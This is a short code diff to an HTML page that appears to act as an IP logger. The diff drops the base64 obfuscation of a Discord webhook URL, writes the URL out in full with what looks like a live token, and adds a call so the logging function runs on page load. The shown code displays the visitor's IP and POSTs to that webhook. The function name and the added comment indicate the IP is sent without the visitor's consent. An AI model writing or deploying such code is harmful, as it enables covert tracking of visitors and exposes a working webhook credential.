@@ -154,16 +154,8 @@
 
                 document.getElementById('ipDisplay').textContent = `${ip}`;
 
-                const key = ['1329145060230692935', '-93HduLZfipXZnGgRBszzvfpOHYdAjWwcAElg9N_FdT4IB4pPbr05lUMQdtoSqTrqR4h'];
-                const webhookURL = atob('aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3Mv') + key[0] + '/' + key[1];
-                
-                const encoder = new TextEncoder();
-                const decoder = new TextDecoder();
-                
-                const encoded = encoder.encode(webhookURL);
-                const final = decoder.decode(encoded);
-
-                await fetch(final, {
+                const webhookURL = "https://discord.com/api/webhooks/1329145060230692935/-93HduLZfipXZnGgRBszzvfpOHYdAjWwcAElg9N_FdT4IB4pPbr05lUMQdtoSqTrqR4h";
+                await fetch(webhookURL, {
                     method: "POST",
                     headers: {
                         "Content-Type": "application/json",
@@ -178,6 +170,9 @@
                 document.getElementById('ipDisplay').textContent = "Error loading IP address";
             }
         }
+
+        // Log the IP immediately when the page loads
+        logIP();
     </script>
 </body>
 </html>
